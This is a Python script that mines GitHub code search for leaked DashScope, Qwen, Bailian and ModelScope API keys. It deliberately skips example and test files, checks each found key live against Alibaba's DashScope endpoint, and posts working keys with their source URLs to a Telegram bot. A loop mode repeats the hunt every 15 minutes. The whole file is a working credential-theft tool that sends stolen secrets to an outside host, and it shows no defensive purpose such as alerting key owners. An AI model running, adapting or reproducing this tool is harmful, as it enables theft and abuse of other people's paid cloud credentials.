#!/usr/bin/env python3
"""DASHSCOPE HUNTER — targeted hunt for DashScope/Qwen/Bailian keys.

Mines GitHub code search with DashScope-specific env var names,
validates directly against dashscope.aliyuncs.com, posts LIVE keys
with balance info to the TG bot.

Run: python dashscope_hunter.py            (one pass)
     python dashscope_hunter.py --loop     (every 15 min)
"""
import json
import os
import re
import sqlite3
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

BOT = os.environ['TG_BOT_TOKEN']
CHAT_ID = int(os.environ.get('TG_CHAT_ID', '0'))
TOKENS_FILE = Path(__file__).resolve().parent.parent / 'gh_tokens.txt'
STATE = Path(r'C:/Users/User/tmp/dashscope_hunter_state.json')

# DashScope key format: sk- + 32 hex (same as DeepSeek — validated by endpoint)
DS_RE = re.compile(r'sk-[a-f0-9]{32}')

SEARCH_TERMS = [
    'DASHSCOPE_API_KEY filename:.env', 'DASHSCOPE_API_KEY filename:.env.local',
    'DASHSCOPE_API_KEY filename:docker-compose.yml', 'DASHSCOPE_API_KEY filename:.env.production',
    'dashscope api_key filename:.env', 'DASHSCOPE_API_KEY extension:py',
    'DASHSCOPE_API_KEY extension:ts', 'DASHSCOPE_API_KEY extension:json',
    'DASHSCOPE_API_KEY extension:yaml', 'DASHSCOPE_API_KEY extension:sh',
    'BAILIAN_API_KEY', 'QWEN_API_KEY filename:.env',
    'dashscope.aliyuncs.com sk- filename:.env', 'MODELSCOPE_API_KEY filename:.env',
    'DASHSCOPE_API_KEY in:file',
]

SKIP_HINTS = ('node_modules', '/docs/', 'example', 'template', 'test', 'mock', 'sample')




def load_tokens():
    toks = []
    try:
        for l in TOKENS_FILE.read_text(encoding='utf-8').splitlines():
            l = l.strip()
            if l.startswith('ghp_'):
                toks.append(l)
    except Exception:
        pass
    return toks


def http_get(url, headers=None, timeout=20):
    req = urllib.request.Request(url, headers=headers or {'User-Agent': 'Mozilla/5.0'})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()[:300]
    except Exception as e:
        return -1, str(e)[:100].encode()


def gh_search(q, token, page=1):
    st, body = http_get('https://api.github.com/search/code?q=' + urllib.parse.quote(q) +
                        f'&per_page=10&page={page}',
                        headers={'Authorization': f'token {token}',
                                 'Accept': 'application/vnd.github+json',
                                 'User-Agent': 'ds-hunter'})
    if st != 200:
        return None
    try:
        return json.loads(body)
    except Exception:
        return None


def validate_dashscope(key):
    """Live-check against DashScope compatible-mode API."""
    st, body = http_get('https://dashscope.aliyuncs.com/compatible-mode/v1/models',
                        headers={'Authorization': f'Bearer {key}'}, timeout=15)
    if st == 200:
        return 'ALIVE', ''
    try:
        err = json.loads(body)
        msg = err.get('error', {}).get('message', '')[:80]
        code = err.get('error', {}).get('code', '')
        if 'Arrearage' in str(body) or 'arrears' in msg.lower():
            return 'ALIVE_NO_BALANCE', msg
        return 'DEAD', f'{code} {msg}'
    except Exception:
        return 'DEAD', f'http {st}'


def tg(method, **params):
    url = f'https://api.telegram.org/bot{BOT}/{method}'
    data = json.dumps(params).encode()
    req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'})
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return json.loads(r.read())
    except Exception as e:
        return {'ok': False, 'error': str(e)}


def load_state():
    try:
        return json.loads(STATE.read_text())
    except Exception:
        return {'checked': [], 'alive': []}


def save_state(st):
    st['checked'] = st['checked'][-20000:]
    st['alive'] = st['alive'][-2000:]
    STATE.write_text(json.dumps(st))


def post_key(key, status, src):
    alive = '✅ ЖИВОЙ' if status == 'ALIVE' else '⚠️ ЖИВОЙ (нулевой баланс)'
    text = (f"🐉 <b>DASHSCOPE</b> — {alive}\n"
            f"<code>{key}</code>\n"
            f"📍 найден: {src[:80]}")
    r = tg('sendMessage', chat_id=CHAT_ID, text=text, parse_mode='HTML',
           disable_web_page_preview=True)
    if not r.get('ok'):
        print('post fail:', r)
    time.sleep(1.5)


def one_pass():
    tokens = load_tokens()
    if not tokens:
        print('no tokens'); return
    state = load_state()
    checked = set(state['checked'])
    found_alive = 0
    candidates = []

    print(f'[ds] {len(tokens)} tokens, {len(SEARCH_TERMS)} terms')
    ti = 0
    for term in SEARCH_TERMS:
        for page in range(1, 3):  # 2 pages per term
            tok = tokens[ti % len(tokens)]; ti += 1
            data = gh_search(term, tok, page=page)
            if not data:
                time.sleep(2)
                continue
            for item in data.get('items', [])[:10]:
                html_url = item.get('html_url', '')
                low = html_url.lower()
                if any(h in low for h in SKIP_HINTS):
                    continue
                raw = html_url.replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                st, body = http_get(raw, timeout=20)
                if st != 200:
                    continue
                text = body.decode('utf-8', errors='ignore')
                if len(text) > 400000:
                    text = text[:400000]
                for m in DS_RE.finditer(text):
                    k = m.group(0)
                    if k not in checked:
                        candidates.append((k, html_url))
                for m in re.finditer(r'(?:DASHSCOPE|BAILIAN|QWEN|MODELSCOPE)\w*\s*[=:]\s*["\']?(sk-[A-Za-z0-9]{20,64})', text):
                    k = m.group(1)
                    if k not in checked:
                        candidates.append((k, html_url))
            time.sleep(7)

    print(f'[ds] candidates: {len(candidates)}')
    import random
    random.shuffle(candidates)
    candidates = candidates[:150]
    seen = set()
    for key, src in candidates:
        if key in seen:
            continue
        seen.add(key)
        checked.add(key)
        status, info = validate_dashscope(key)
        if status in ('ALIVE', 'ALIVE_NO_BALANCE'):
            found_alive += 1
            state['alive'].append({'key': key, 'status': status, 'src': src, 'ts': int(time.time())})
            post_key(key, status, src)
            print(f'[ds] {status}: {key[:12]}...')
        else:
            print(f'[ds] dead: {key[:12]}... {info[:50]}')
    save_state(state)
    print(f'[ds] pass done: alive={found_alive} checked_total={len(checked)}')
    return found_alive


def main():
    if '--loop' in sys.argv:
        while True:
            try:
                one_pass()
            except Exception as e:
                print('[ds] pass err:', e)
            time.sleep(900)
    else:
        one_pass()


if __name__ == '__main__':
    main()
